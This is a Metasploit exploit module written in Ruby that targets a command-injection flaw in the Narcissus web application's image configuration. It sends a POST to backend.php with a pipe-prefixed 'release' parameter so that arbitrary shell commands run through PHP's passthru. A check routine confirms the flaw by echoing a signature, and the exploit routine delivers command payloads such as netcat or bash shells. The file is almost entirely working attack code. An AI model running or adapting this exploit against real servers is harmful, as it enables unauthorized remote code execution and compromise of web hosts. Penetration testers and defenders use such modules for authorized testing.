# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Narcissus Image Configuration Passthru Vulnerability",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Narcissus image configuration
                function.  This is due to the backend.php file not handling the $release parameter
                properly, and then passes it on to the configure_image() function.  In this
                function, the $release parameter can be used to inject system commands for
                passthru (a PHP function that&#039;s meant to be used to run a bash script by the
                vulnerable application), which allows remote code execution under the context
                of the web server.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Dun&#039;,    #Original
                    &#039;sinn3r&#039;  #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;, &#039;22709&#039; ],
                    [ &#039;BID&#039;, &#039;87410&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0d\x0a"
                },
            &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Compat&#039;         =>
                {
                    &#039;PayloadType&#039; => &#039;cmd&#039;,
                    &#039;RequiredCmd&#039; => &#039;generic perl ruby python bash netcat-e&#039;
                },
            &#039;Targets&#039;        =>
                [
                    [&#039;Narcissus&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Nov 14 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to the web application&#039;, &#039;/narcissus-master/&#039;])
            ], self.class)
    end
 
    def base
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        return uri
    end
 
    def peer
        "#{rhost}:#{rport}"
    end
 
    def remote_exe(command)
        res = send_request_cgi({
            &#039;uri&#039;      => "#{base}backend.php",
            &#039;method&#039;   => &#039;POST&#039;,
            &#039;encode_params&#039; => false,
            &#039;vars_post&#039; => {
                &#039;machine&#039; => &#039;0&#039;,
                &#039;action&#039;  => &#039;configure_image&#039;,
                &#039;release&#039; => "|#{command}"
            }
        })
 
        vprint_line(res.body) if res
        return res
    end
 
    def check
        sig = rand_text_alpha(rand(10) + 5)  #The string to check
 
        print_status("#{peer} - Looking for signature &#039;#{sig}&#039;...")
        res = remote_exe("echo #{sig}")
 
        if res and res.body =~ /#{sig}/
            print_status("#{peer} - Signature &#039;#{sig}&#039; found.")
            return Exploit::CheckCode::Vulnerable
        else
            print_status("#{peer} - Signature not found")
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        print_status("#{peer} - Sending malicious request...")
        remote_exe(payload.encoded)
    end
 
 
end

